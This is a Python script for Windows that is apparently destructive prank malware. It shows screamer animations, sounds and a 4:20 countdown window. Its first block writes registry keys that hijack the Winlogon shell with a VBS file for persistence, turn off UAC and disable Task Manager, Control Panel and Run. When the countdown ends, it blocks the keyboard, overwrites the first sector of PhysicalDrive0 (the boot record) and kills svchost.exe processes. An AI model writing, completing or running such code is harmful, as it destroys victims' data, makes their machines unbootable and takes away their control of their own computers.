import sounddevice as sd
import soundfile as sf
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLabel
from PyQt5.QtGui import QPixmap, QPainter, QColor, QFont, QMouseEvent
from PyQt5.QtCore import Qt, QPoint, QTimer
import pygame
import time
import os
from moviepy.editor import *
import threading
import ctypes
import os
import shutil
import ctypes
from win32file import *
from win32ui import * 
from win32con import * 
from win32gui import *
from sys import exit
import psutil
import subprocess
import keyboard
import winshell
import pythoncom
from win32com.client import Dispatch
import win32process
import pyautogui as p

user = os.getlogin()

if not os.path.exists(r'C:\Windows\hemp\420-279\scremer.txt'):
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, wscript.exe "C:\Windows\hemp\420-279\hemp.vbs"" /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f')
    subprocess.run(r'c:\windows\system32\cmd.exe /C cscript "C:\Windows\hemp\420-279\lol.vbs"')
    subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im explorer.exe')
    subprocess.run(r'c:\windows\system32\cmd.exe /C explorer.exe')

file_path = r'C:\Windows\hemp\420-279\lol.exe'
os.system(file_path)

all_keys = [chr(i) for i in range(32, 127)] + ["tab", "alt", "ctrl", "shift", "esc"]

if '#' in all_keys:
    all_keys.remove('#')

blocked_keys = set()

for key in all_keys:
    if keyboard.is_modifier(key):
        blocked_keys.add(key)
        keyboard.block_key(key)
        
def ded():
    global stop_processes  
    stop_processes = True  
    
    all_keys = [chr(i) for i in range(32, 127)] + ["enter", "tab", "space", "alt", "ctrl", "shift", "esc", "win", "backspace"]
    
    if '#' in all_keys:
        all_keys.remove('#')
    
    for key in all_keys:
        keyboard.block_key(key)
        
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) 
    WriteFile(hDevice, AllocateReadBuffer(512), None) 
    CloseHandle(hDevice)
    
    pygame.init()

    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)

    gif = VideoFileClip(r'C:\Windows\hemp\420-279\dad.gif')

    gif = gif.resize(screen.get_size())

    frames = [pygame.image.fromstring(frame.tobytes(), gif.size, "RGB") for frame in gif.iter_frames()]

    pygame.mixer.music.load(r'C:\Windows\hemp\420-279\dad.mp3')

    pygame.mixer.music.play()
    start_time = time.time()
    running = True

    clock = pygame.time.Clock()

    def print_one():
        for process in psutil.process_iter(['pid', 'name']):
            if 'svchost.exe' in process.info['name']:
                os.kill(process.info['pid'], 9)

    timer = threading.Timer(58, print_one)
    timer.start()

    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        elapsed_time = time.time() - start_time

        frame_index = int(elapsed_time * gif.reader.fps)
        if frame_index < len(frames):
            frame_surface = frames[frame_index]
            screen.blit(frame_surface, (0, 0))
        pygame.display.flip()

        clock.tick(30)

    pygame.quit()
    
def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 0x0014
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDCHANGE = 0x02

    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)

if not os.path.exists(r'C:\Windows\hemp\420-279\scremer.txt'):
    image_path = r'C:\Windows\hemp\420-279\fon.png'
    set_wallpaper(image_path)
    
    pygame.init()

    
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)

    gif = VideoFileClip(r'C:\Windows\hemp\420-279\img.gif')

    gif = gif.resize(screen.get_size())

    frames = [pygame.image.fromstring(frame.tobytes(), gif.size, "RGB") for frame in gif.iter_frames()]

    pygame.mixer.music.load(r'C:\Windows\hemp\420-279\audio.mp3')

    pygame.mixer.music.play()
    start_time = time.time()
    running = True

    clock = pygame.time.Clock()
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        elapsed_time = time.time() - start_time
        if elapsed_time >= 4:
            running = False

        if elapsed_time >= 3:  
            screen.fill((0, 0, 0))  
            pygame.display.flip()

        else:
            frame_index = int(elapsed_time * gif.reader.fps) 
            if frame_index < len(frames):
                frame_surface = frames[frame_index]
                screen.blit(frame_surface, (0, 0))
            pygame.display.flip()
            time.sleep(0.05) 
            screen.fill((0, 0, 0))
            pygame.display.flip()
            time.sleep(0.05)

        clock.tick(30)

    pygame.quit()
    open(r'C:\Windows\hemp\420-279\scremer.txt', 'w')

    
def play_audio(file_path):
    data, sample_rate = sf.read(file_path, dtype='float32')
    sd.play(data, sample_rate)
    status = sd.wait()

def open_window():
    class TransparentTextWidget(QWidget):
        def __init__(self):
            super().__init__()
            self.setGeometry(100, 100, 281, 410)
            self.setWindowTitle("420")
            self.setWindowFlags(
                Qt.FramelessWindowHint | 
                Qt.WindowStaysOnTopHint |  
                Qt.X11BypassWindowManagerHint | 
                Qt.Tool
            )
            self.setAttribute(Qt.WA_TranslucentBackground)
            self.dragging = False
            self.offset = QPoint()

            self.image = QPixmap(r'C:\Windows\hemp\420-279\img.png')

            self.image_label = QLabel(self)
            self.image_label.setPixmap(self.image)
            self.image_label.setGeometry(0, 0, self.width(), self.height())

            self.text_label = QLabel(self)
            self.text_label.setFont(QFont("Arial", 16))
            self.text_label.setStyleSheet("background-color: rgba(0, 0, 0, 0);")
            self.text_label.move(self.width() // 2 - self.text_label.width() // 2,
                                 self.height() // 2 - self.text_label.height() // 2) 
            self.text_label.adjustSize()

            self.text_label.setAlignment(Qt.AlignCenter) 

            self.timer = QTimer(self)
            self.timer.setInterval(1000) 
            self.timer.timeout.connect(self.update_timer)
            self.remaining_time = 4*60+20
            
        def set_text_position(self, x, y):
            self.text_label.move(x, y)

        def mousePressEvent(self, event: QMouseEvent):
            if event.button() == Qt.LeftButton:
                self.dragging = True
                self.offset = event.pos()

        def mouseMoveEvent(self, event: QMouseEvent):
            if self.dragging:
                self.move(event.globalPos() - self.offset)

        def mouseReleaseEvent(self, event: QMouseEvent):
            if event.button() == Qt.LeftButton:
                self.dragging = False

        def paintEvent(self, event):
            painter = QPainter(self)
            painter.setRenderHint(QPainter.Antialiasing)
            painter.setRenderHint(QPainter.TextAntialiasing)
            painter.setCompositionMode(QPainter.CompositionMode_SourceOver)
            painter.fillRect(self.rect(), QColor(0, 0, 0, 0))
            
        def update_text_color(self):
            if self.remaining_time <= 15:
                self.text_label.setStyleSheet("background-color: rgba(0, 0, 0, 0); color: #880015;")
            else:
                self.text_label.setStyleSheet("background-color: rgba(0, 0, 0, 0); color: #000;")

        def update_timer(self):
            if self.remaining_time > 0:
                minutes = self.remaining_time // 60
                seconds = self.remaining_time % 60
                self.text_label.setText(f"{minutes:02d}:{seconds:02d}")
                self.text_label.adjustSize()
                self.remaining_time -= 1
                self.update_text_color()
            else:
                self.timer.stop()
                self.close()
                ded()
                
    app = QApplication(sys.argv)
    widget = TransparentTextWidget()
    widget.show()

    widget.set_text_position(136, 107)

    widget.timer.start()

    sys.exit(app.exec_())


audio_file = r'C:\Windows\hemp\420-279\music.mp3'

audio_thread = threading.Thread(target=play_audio, args=(audio_file,))
audio_thread.start()

open_window()